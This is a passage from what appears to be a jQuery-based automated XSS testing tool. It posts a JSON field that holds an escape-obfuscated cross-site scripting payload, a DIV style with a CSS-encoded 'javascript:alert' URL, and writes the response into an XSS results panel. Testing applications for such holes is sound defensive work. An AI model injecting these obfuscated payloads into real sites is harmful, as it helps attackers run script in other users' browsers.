        value: "<DIV STYLE=\"background - image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058."
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    })
  ).then(function() {
    $(self).removeClass('disabled');
  });
});
